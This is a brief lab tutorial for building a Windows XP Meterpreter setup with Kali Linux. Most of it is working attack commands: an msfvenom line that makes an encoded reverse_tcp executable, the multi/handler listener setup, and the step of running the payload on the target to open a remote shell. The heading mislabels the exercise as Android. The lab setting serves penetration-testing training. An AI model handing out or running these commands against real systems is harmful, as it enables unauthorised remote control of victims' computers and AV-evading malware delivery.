### **Windows XP Meterpreter Practical Setup**

#### **1. Components Required:**

- **Kali Linux** (as the attacker machine)
- **Windows XP** (64-bit ISO as the target machine)

---

### **2. Network Configuration:**

- Configure both **Kali Linux** and **Windows XP** Virtual Machines in **NAT Network** mode:
    - Ensures both machines have internet access.
    - Facilitates communication between them.
- Use the `ping` command to verify connectivity between the two machines.

### **3. Practical: Android Meterpreter (Windows XP)**

#### **Step 1: Generate Payload on Kali Linux**

Use **msfvenom** to create a malicious executable file:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Kali_IP> LPORT=4000 -f exe > sunbeam.exe
```

#### **Step 2: Set Up Listener on Kali Linux**

1. Open **Metasploit Framework**:
    ```bash
    msfconsole
    ```
2. Configure the handler:
    ```bash
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <Kali_IP>
    set LPORT 4000
    exploit
    ```

#### **Step 3: Execute Payload on Windows XP**

1. Transfer the generated payload (`sunbeam.exe`) to the **Windows XP** machine.
2. Run the file on the Windows XP system to establish a reverse connection.

### **4. Notes:**

- Use the `help` command within Metasploit for assistance with available commands and their usage.
